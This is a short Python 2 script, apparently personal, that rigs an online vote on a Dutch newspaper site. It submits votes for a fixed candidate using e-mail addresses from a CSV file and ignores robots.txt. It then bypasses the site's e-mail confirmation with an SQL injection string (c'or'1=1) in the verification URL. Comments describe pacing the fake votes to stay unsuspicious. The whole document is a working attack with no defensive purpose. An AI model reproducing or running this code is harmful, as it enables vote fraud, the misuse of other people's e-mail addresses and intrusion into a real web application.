# Tactic:
# - Every monday 09:00 look at amount of votes
# - Vote half of them
#
# So e.g. in case there are 400 votes, vote 200 times
# Then he will win and it will be less suspicious

import mechanize
import urllib
import urllib2
import time
import random
import csv

f = open('emaillijst.csv')
csv_f = csv.reader(f)
vote = "332"

counter = 0;
for row in csv_f:
    email = row[0]
    counter = counter + 1
    print email
    if counter < 250:
        print "wait"
    elif counter > 500:
        exit(0);
    else:
        url = "http://klasbak.bdinternet.nl/"
        br = mechanize.Browser()
        br.set_handle_robots(False) # ignore robots
        br.open(url)
        br.select_form(nr=0)
        br["kei_ehv"] = [vote]
        br["email"] = email
        res = br.submit()
        content = res.read()
        content = urllib2.urlopen("http://klasbak.bdinternet.nl/include/bevestig_stem.php?email=" + email + "&controle=c'or'1=1&gen=" + vote)
        
        #print content.readlines()
        #time.sleep(10 * random.randint(1,10))
